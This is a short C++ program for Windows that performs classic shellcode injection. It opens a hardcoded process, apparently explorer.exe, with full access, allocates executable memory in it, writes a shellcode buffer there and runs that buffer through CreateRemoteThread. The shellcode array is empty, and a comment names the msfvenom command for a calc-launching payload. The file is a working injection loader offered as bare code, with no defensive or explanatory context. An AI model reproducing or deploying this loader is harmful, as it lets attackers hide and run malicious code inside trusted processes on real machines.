#include <Windows.h>

int main(int argc, char* argv[])
{
	// PID of explorer.exe
	DWORD pid = 5284;

	// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c 
	unsigned char shellcode[] = "";
	SIZE_T shellcodeSize = sizeof(shellcode);

	HANDLE hProcess;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	PVOID baseAddress;
	baseAddress = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(hProcess, baseAddress, shellcode, shellcodeSize, nullptr);

	HANDLE hThread;
	hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)baseAddress, nullptr, 0, nullptr);

	CloseHandle(hProcess);

	return 0;
}